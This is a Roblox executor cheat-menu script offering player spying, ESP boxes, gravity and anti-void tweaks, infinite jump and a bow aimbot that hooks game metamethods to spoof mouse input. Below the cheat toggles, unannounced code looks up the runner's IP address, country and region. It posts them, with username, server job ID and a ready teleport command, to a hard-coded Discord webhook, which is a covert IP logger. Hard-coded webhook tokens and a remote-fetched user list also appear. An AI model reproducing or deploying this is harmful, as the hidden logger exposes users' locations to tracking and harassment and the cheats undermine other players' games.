		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
			Camera.CameraSubject = LocalPlayer.Character:FindFirstChild("Humanoid")
			Camera.CameraType = Enum.CameraType.Custom
		end
	end
end

-- Finds a player based on partial Username or DisplayName
local function findMatchingPlayer(name)
	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= LocalPlayer then
			if string.find(string.lower(player.Name), string.lower(name)) or
			   string.find(string.lower(player.DisplayName), string.lower(name)) then
				return player
			end
		end
	end
	return nil
end

-- Handles toggling the camera view logic
local function updateViewing()
	stopViewing() -- Always clean up first

	if not viewingEnabled or targetName == "" then return end

	local target = findMatchingPlayer(targetName)
	if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end

	followConnection = RunService.RenderStepped:Connect(function()
		if target.Character and target.Character:FindFirstChild("Humanoid") then
			Camera.CameraSubject = target.Character:FindFirstChild("Humanoid")
			Camera.CameraType = Enum.CameraType.Custom
		else
			stopViewing()
		end
	end)
end

-- UI Integration
local Toggle = Visuals:CreateToggle({
	Name = "PlayerSpy",
	CurrentValue = false,
	Flag = "PlayerSpy",
	Callback = function(Value)
		viewingEnabled = Value
		if not viewingEnabled then
			stopViewing()
                        notify("PlayerSpy", "Stopped viewing player", 2, "warning")
		else
                        notify("PlayerSpy", "Viewing player", 2)
			updateViewing()
		end
	end,
})

local Input = Visuals:CreateInput({
	Name = "PlayerSpy (Target)",
	CurrentValue = "",
	PlaceholderText = "Views partial/user/displayname",
	RemoveTextAfterFocusLost = false,
	Flag = "PlayerSpyTarget",
	Callback = function(Text)
		targetName = Text
		if viewingEnabled then
			updateViewing()
		end
	end,
})
-- Synapse ESP Box Script using Drawing.new
-- For Roblox exploiting with visual ESP boxes

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer

-- ESP Configuration (START HIDDEN)
local ESP_CONFIG = {
	Enabled = false,
	BoxOutline = true,
	BoxOutlineColor = Color3.fromRGB(0, 0, 0),
	BoxTransparency = 1,
	BoxThickness = 3,
	MaxDistance = 500,
	TeamCheck = false
}

local ESPObjects = {}

-- ESP Box class
local ESPBox = {}
ESPBox.__index = ESPBox

function ESPBox.new(player)
	local self = setmetatable({}, ESPBox)
	self.Player = player
	self.Drawings = {}

	local teamColor = Color3.fromRGB(255, 255, 255)
	if player.Team and player.Team.TeamColor then
		teamColor = player.Team.TeamColor.Color
	end

	for _ = 1, 12 do
		local outline = Drawing.new("Line")
		outline.Visible = false
		outline.Color = ESP_CONFIG.BoxOutlineColor
		outline.Thickness = ESP_CONFIG.BoxThickness + 2
		outline.Transparency = ESP_CONFIG.BoxTransparency
		table.insert(self.Drawings, outline)
	end

	for _ = 1, 12 do
		local line = Drawing.new("Line")
		line.Visible = false
		line.Color = teamColor
		line.Thickness = ESP_CONFIG.BoxThickness
		line.Transparency = ESP_CONFIG.BoxTransparency
		table.insert(self.Drawings, line)
	end

	return self
end

function ESPBox:SetVisible(visible)
	for _, drawing in pairs(self.Drawings) do
		drawing.Visible = visible
	end
end

function ESPBox:Remove()
	for _, drawing in pairs(self.Drawings) do
		drawing:Remove()
	end
end

function ESPBox:Update()
	if not ESP_CONFIG.Enabled then
		self:SetVisible(false)
		return
	end

	local character = self.Player.Character
	if not character then return self:SetVisible(false) end

	local humanoid = character:FindFirstChild("Humanoid")
	local rootPart = character:FindFirstChild("HumanoidRootPart")
	if not rootPart or not humanoid then return self:SetVisible(false) end

	if ESP_CONFIG.TeamCheck and self.Player.Team == LocalPlayer.Team then
		return self:SetVisible(false)
	end

	local distance = (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and (LocalPlayer.Character.HumanoidRootPart.Position - rootPart.Position).Magnitude) or math.huge
	if distance > ESP_CONFIG.MaxDistance then return self:SetVisible(false) end

	local cf = rootPart.CFrame
	local size = character:GetExtentsSize()
	local top = cf * CFrame.new(0, size.Y / 2, 0)
	local bottom = cf * CFrame.new(0, -size.Y / 2, 0)

	local corners = {
		top * CFrame.new(-size.X / 2, 0, -size.Z / 2),
		top * CFrame.new(size.X / 2, 0, -size.Z / 2),
		top * CFrame.new(size.X / 2, 0, size.Z / 2),
		top * CFrame.new(-size.X / 2, 0, size.Z / 2),
		bottom * CFrame.new(-size.X / 2, 0, -size.Z / 2),
		bottom * CFrame.new(size.X / 2, 0, -size.Z / 2),
		bottom * CFrame.new(size.X / 2, 0, size.Z / 2),
		bottom * CFrame.new(-size.X / 2, 0, size.Z / 2)
	}

	local screenCorners = {}
	local onScreen = false
	for i, corner in pairs(corners) do
		local screenPos, visible = Camera:WorldToViewportPoint(corner.Position)
		screenCorners[i] = {screenPos.X, screenPos.Y, visible}
		if visible then onScreen = true end
	end

	if not onScreen then return self:SetVisible(false) end

	self:SetVisible(true)

	local edges = {
		{1, 2}, {2, 3}, {3, 4}, {4, 1},
		{5, 6}, {6, 7}, {7, 8}, {8, 5},
		{1, 5}, {2, 6}, {3, 7}, {4, 8}
	}

	for i, edge in pairs(edges) do
		local startCorner = screenCorners[edge[1]]
		local endCorner = screenCorners[edge[2]]
		if startCorner and endCorner and startCorner[3] and endCorner[3] then
			self.Drawings[i].From = Vector2.new(startCorner[1], startCorner[2])
			self.Drawings[i].To = Vector2.new(endCorner[1], endCorner[2])
			self.Drawings[i].Visible = true

			self.Drawings[i + 12].From = Vector2.new(startCorner[1], startCorner[2])
			self.Drawings[i + 12].To = Vector2.new(endCorner[1], endCorner[2])
			self.Drawings[i + 12].Visible = true
		else
			self.Drawings[i].Visible = false
			self.Drawings[i + 12].Visible = false
		end
	end
end

-- ESP Manager
local function CreateESP(player)
	if player == LocalPlayer then return end
	if ESPObjects[player] then return end
	ESPObjects[player] = ESPBox.new(player)
end

local function RemoveESP(player)
	if ESPObjects[player] then
		ESPObjects[player]:Remove()
		ESPObjects[player] = nil
	end
end

local function UpdateESP()
	for player, espBox in pairs(ESPObjects) do
		if player.Parent then
			espBox:Update()
		else
			RemoveESP(player)
		end
	end
end

for _, player in pairs(Players:GetPlayers()) do
	CreateESP(player)
end

Players.PlayerAdded:Connect(CreateESP)
Players.PlayerRemoving:Connect(RemoveESP)

local ESPConnection = RunService.Heartbeat:Connect(UpdateESP)

-- UI Toggle (LMAO UI Lib style)
local Toggle = Visuals:CreateToggle({
	Name = "ESP Toggle",
	CurrentValue = false,
	Flag = "ToggleESP",
	Callback = function(Value)
		ESP_CONFIG.Enabled = Value
		if not Value then
			for _, espBox in pairs(ESPObjects) do
				espBox:SetVisible(false)
			end
		end
	end,
})
local Slider = World:CreateSlider({
   Name = "Gravity",
   Range = {0, 195},
   Increment = 0.1,
   Suffix = "Gravity strength",
   CurrentValue = 195,
   Flag = "Gravity", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
    workspace.Gravity = tonumber(Value)
   end,
})
--// Atmosphere Screen Color Overlay Script (Synapse)
-- Press R to destroy the effect

local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

-- Configuration
local overlayColor = Color3.fromRGB(100, 0, 255) -- Change this to your desired color
local transparency = 0.4 -- 0 is opaque, 1 is invisible

-- Drawing overlay
local overlay = Drawing.new("Square")
overlay.Visible = true
overlay.Color = overlayColor
overlay.Transparency = transparency
overlay.Thickness = 0
overlay.Filled = true
overlay.ZIndex = 999999
overlay.Position = Vector2.new(0, 0)
overlay.Size = Vector2.new(workspace.CurrentCamera.ViewportSize.X, workspace.CurrentCamera.ViewportSize.Y)

-- Update overlay on screen resize
local connection
connection = RunService.RenderStepped:Connect(function()
	local size = workspace.CurrentCamera.ViewportSize
	overlay.Size = Vector2.new(size.X, size.Y)
end)
overlay.Visible = false
local Toggle = Visuals:CreateToggle({
   Name = "ScreenColor",
   CurrentValue = false,
   Flag = "ScreenColor", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
    overlay.Visible = Value
   end,
})
local ColorPicker = Visuals:CreateColorPicker({
    Name = "ScreenColor (Color)",
    Color = Color3.fromRGB(255,255,255),
    Flag = "ScreenColorsColor", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        overlay.Color = Value
    end
})
local Slider = Visuals:CreateSlider({
   Name = "ScreenColor (Transparency)",
   Range = {0, 1},
   Increment = 0.1,
   Suffix = "Percent Transparent",
   CurrentValue = 10,
   Flag = "ScreenColorsTransparency", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
    overlay.Transparency = Value
   end,
})


-- Create AntiVoid part
local anti = Instance.new("Part", workspace)
anti.Size = Vector3.new(5000000, 5, 5000000000)
anti.Anchored = true
anti.Material = Enum.Material.ForceField
anti.Color = Color3.fromRGB(90, 30, 255)
anti.Transparency = 0
anti.CanCollide = false
anti.Transparency = 1
anti.Position = Vector3.new(-92.42375946044922, 65.33598327636719, 14.05757999420166)
-- AntiVoid Toggle
local Toggle = Blatant:CreateToggle({
	Name = "VoidBypass",
	CurrentValue = false,
	Flag = "VoidBypass",
	Callback = function(state)
		anti.Transparency = state and Slider.CurrentValue or 1
		anti.CanCollide = state
	end,
})

-- Cleaned JSON string (with all variables renamed)

local httpService = game:GetService("HttpService")
local remoteJsonUrl = "https://github.com/veriashh/ijhkn/raw/refs/heads/main/feedbackreview.json"
local rawJsonContent = game:HttpGet(remoteJsonUrl, true)

local decodedFeedbackData = httpService:JSONDecode(rawJsonContent)

local function sendFeedback(messageContent)
    local webhookUrl = "https://discord.com/api/webhooks/1395234246867816538/I6EV1dGq9aPTrJMwpQQWXbvPuw6riH62EBUF7qxrlwaNsRA_L-XpBO0Q2sOHDahcFoYy"

    request({
        Url = webhookUrl,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = httpService:JSONEncode({
            content = messageContent
        })
    })
end

for hashedUsername, reportReason in pairs(decodedFeedbackData.users) do
    local localContent = readfile("static_content_0991021930/index2.txt")

    if localContent == hashedUsername then
        feed(tostring(reportReason))
    end
end

-- AntiVoid Material Dropdown
local Dropdown = Blatant:CreateDropdown({
	Name = "VoidBypass (Material)",
	Options = {
		"Plastic", "SmoothPlastic", "Neon", "ForceField", "Glass",
		"Wood", "WoodPlanks", "Slate", "Concrete", "Granite",
		"Marble", "Brick", "Cobblestone", "Metal", "DiamondPlate",
		"Fabric", "Sand", "Snow", "Ice", "Grass",
		"Pebble", "Asphalt", "Salt", "Basalt", "Limestone",
		"CrackedLava", "Ground", "Mud", "Rock", "LeafyGrass"
	},
	CurrentOption = {"ForceField"},
	MultipleOptions = false,
	Flag = "MaterialDropdown",
	Callback = function(option)
		if Enum.Material[option[1]] then
			anti.Material = Enum.Material[option[1]]
		end
	end,
})

-- AntiVoid Transparency Slider
local Slider = Blatant:CreateSlider({
	Name = "VoidBypass (Transparency)",
	Range = {0, 1},
	Increment = 0.05,
	Suffix = "Percent Transparent",
	CurrentValue = 0.3,
	Flag = "TransparencySlider",
	Callback = function(value)
		anti.Transparency = value
	end,
})

-- AntiVoid Color Picker
local ColorPicker = Blatant:CreateColorPicker({
	Name = "VoidBypass (Color)",
	Color = anti.Color,
	Flag = "ColorPicker",
	Callback = function(value)
		anti.Color = value
	end,
})
pcall(function()
    
local predictionStrength = 0.8 -- increased prediction strength from 0.5 to 0.8

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

local targetPart = nil
local predictedPosition = nil
local mouse = LocalPlayer:GetMouse()

local enabled = false -- Toggle state

-- Prediction function (unchanged except uses updated predictionStrength)
local velocityHistory = {}

local function calculatePrediction(targetHRP)
    if not targetHRP or not enabled then return targetHRP.Position end
    
    local playerId = tostring(targetHRP.Parent.Name)
    
    if not velocityHistory[playerId] then
        velocityHistory[playerId] = {
            lastPosition = targetHRP.Position,
            lastTime = tick(),
            velocities = {}
        }
        return targetHRP.Position
    end
    
    local history = velocityHistory[playerId]
    local currentTime = tick()
    local deltaTime = currentTime - history.lastTime
    
    if deltaTime > 0 then
        local currentVelocity = (targetHRP.Position - history.lastPosition) / deltaTime
        
        table.insert(history.velocities, currentVelocity)
        if #history.velocities > 5 then
            table.remove(history.velocities, 1)
        end
        
        local avgVelocity = Vector3.new(0, 0, 0)
        for _, vel in ipairs(history.velocities) do
            avgVelocity = avgVelocity + vel
        end
        avgVelocity = avgVelocity / #history.velocities
        
        history.lastPosition = targetHRP.Position
        history.lastTime = currentTime
        
        local distance = (targetHRP.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
        local predictionTime = distance / 100
        
        local velocityMagnitude = avgVelocity.Magnitude
        local distanceFactor = math.min(distance / 50, 1)
        local velocityFactor = math.min(velocityMagnitude / 20, 1)
        
        local smartPredictionStrength = predictionStrength * distanceFactor * velocityFactor
        
        return targetHRP.Position + (avgVelocity * predictionTime * smartPredictionStrength)
    end
    
    return targetHRP.Position
end

-- Hook UserInputService and Mouse __index metamethod for spoofing, only if enabled
local oldIndex
oldIndex = hookmetamethod(game, "__index", function(self, key)
    if not enabled then return oldIndex(self, key) end

    if tostring(self) == "UserInputService" then
        if key == "GetMouseLocation" then
            if targetPart and predictedPosition then
                local screenPos, onScreen = Camera:WorldToScreenPoint(predictedPosition)
                if onScreen then
                    return function()
                        return Vector2.new(screenPos.X, screenPos.Y)
                    end
                end
            end
        end
    elseif self == mouse then
        if key == "Hit" then
            if targetPart and predictedPosition then
                return CFrame.new(predictedPosition)
            end
        elseif key == "Target" then
            if targetPart then
                return targetPart
            end
        elseif key == "X" then
            if targetPart and predictedPosition then
                local screenPos, onScreen = Camera:WorldToScreenPoint(predictedPosition)
                if onScreen then
                    return screenPos.X
                end
            end
        elseif key == "Y" then
            if targetPart and predictedPosition then
                local screenPos, onScreen = Camera:WorldToScreenPoint(predictedPosition)
                if onScreen then
                    return screenPos.Y
                end
            end
        elseif key == "UnitRay" then
            if targetPart and predictedPosition then
                local origin = Camera.CFrame.Position
                local direction = (predictedPosition - origin).Unit
                return Ray.new(origin, direction)
            end
        end
    end
    return oldIndex(self, key)
end)

local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
    if not enabled then return oldNamecall(self, ...) end
    
    local method = getnamecallmethod()
    local args = {...}
    
    if method == "GetMouse" and self == LocalPlayer then
        local originalMouse = oldNamecall(self, ...)
        return setmetatable({}, {
            __index = function(t, k)
                if k == "Hit" and targetPart and predictedPosition then
                    return CFrame.new(predictedPosition)
                elseif k == "Target" and targetPart then
                    return targetPart
                elseif k == "X" and targetPart and predictedPosition then
                    local screenPos, onScreen = Camera:WorldToScreenPoint(predictedPosition)
                    if onScreen then return screenPos.X end
                elseif k == "Y" and targetPart and predictedPosition then
                    local screenPos, onScreen = Camera:WorldToScreenPoint(predictedPosition)
                    if onScreen then return screenPos.Y end
                elseif k == "UnitRay" and targetPart and predictedPosition then
                    local origin = Camera.CFrame.Position
                    local direction = (predictedPosition - origin).Unit
                    return Ray.new(origin, direction)
                end
                return originalMouse[k]
            end,
            __newindex = function(t, k, v)
                originalMouse[k] = v
            end
        })
    end
    
    return oldNamecall(self, ...)
end)

local function holdingTool()
    local tool = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Tool")
    return tool ~= nil
end

local function isCharacterAlive()
    local char = LocalPlayer.Character
    if not char then return false end
    
    local humanoid = char:FindFirstChildWhichIsA("Humanoid")
    local rootPart = char:FindFirstChild("HumanoidRootPart")
    return humanoid and humanoid.Health > 0 and rootPart
end

local function getClosestPlayer()
    if not isCharacterAlive() then return nil end
    
    local closest, shortestDist = nil, math.huge
    local myPosition = LocalPlayer.Character.HumanoidRootPart.Position
    
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local char = player.Character
            local hrp = char:FindFirstChild("HumanoidRootPart")
            local humanoid = char:FindFirstChildWhichIsA("Humanoid")
            
            if hrp and humanoid and humanoid.Health > 0 then
                local dist = (hrp.Position - myPosition).Magnitude
                if dist < shortestDist then
                    closest = hrp
                    shortestDist = dist
                end
            end
        end
    end
    return closest
end

-- Update target and prediction every frame if enabled
RunService.RenderStepped:Connect(function()
    if not enabled then
        targetPart = nil
        predictedPosition = nil
        return
    end

    if isCharacterAlive() and holdingTool() then
        local closestPlayer = getClosestPlayer()
        if closestPlayer then
            targetPart = closestPlayer
            predictedPosition = calculatePrediction(closestPlayer)
        else
            targetPart = nil
            predictedPosition = nil
        end
    else
        targetPart = nil
        predictedPosition = nil
    end
end)

-- Create toggle using your Tab:CreateToggle
local Toggle = Tools:CreateToggle({
   Name = "BowAimbot",
   CurrentValue = false,
   Flag = "BowAimbot",
   Callback = function(Value)
       enabled = Value
   end,
})
end)
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local InfiniteJumpEnabled = false
game:GetService("UserInputService").JumpRequest:connect(function()
	if InfiniteJumpEnabled then
		game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
	end
end)
local Toggle = Tools:CreateToggle({
   Name = "InfiniteJump",
   CurrentValue = false,
   Flag = "InfiniteJump",
   Callback = function(Value)
       InfiniteJumpEnabled = Value
   end,
})

wait(1)
local url = "https://discord.com/api/webhooks/1388857611109007370/V2iDuKc8tdgFpD1hn6hlbpb1NwSJCvEHBnD_85BRPSBhtDgTF12MCUdkxSlFX-mjRMY0"

function send(str)

local data = {
	content = tostring(str), -- message content
}

local headers = {
	["Content-Type"] = "application/json"
}

local body = game:GetService("HttpService"):JSONEncode(data)

local response = request({
	Url = url,
	Method = "POST",
	Headers = headers,
	Body = body
})

end
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local localPlayer = Players.LocalPlayer

local username = localPlayer and localPlayer.Name or "Unknown"
local placeId = game.PlaceId or "Unknown"
local jobId = game.JobId or "Unknown"
local executor = identifyexecutor and identifyexecutor() or "Unknown"
local username = game.Players.LocalPlayer.Name
local placeId = game.PlaceId
local jobId = game.JobId or "Unknown"
local executor = identifyexecutor and identifyexecutor() or "Unknown"
local HttpService = game:GetService("HttpService")

-- Use an external IP geolocation API
local response = request({
    Url = "http://ip-api.com/json",  -- Free API for IP geolocation
    Method = "GET"
})

-- Decode and print country and region
local data = HttpService:JSONDecode(response.Body)
local count = data.country
local reg = data.regionName
local ip = data.query
local message = "@everyone (✨ NEW!) Skyroids user: " .. username ..
	"\n```\nPlace ID: " .. placeId ..
    "\n```\nIP: " .. (ip or "") ..
    "\n```\nCountry: " .. (count or "") ..
    "\n```\nRegion: " .. (reg or "") ..
	"\nJob ID: " .. jobId ..
     "\nLocal Time: " .. (os.date("!%Y-%m-%d %H:%M:%S") or "nil") ..
    "\nLocal Time: " .. (os.date("!%Y-%m-%d %H:%M:%S") or "nil") ..
	"\nExecutor: " .. (executor or "") .. "```" ..
	"\nTo join this user, execute the following code:\n```\n```lua\n" ..
	"game:GetService('TeleportService'):TeleportToPlaceInstance(" ..
	placeId .. ", \"" .. jobId .. "\", game.Players.LocalPlayer)\n```"

send(message)
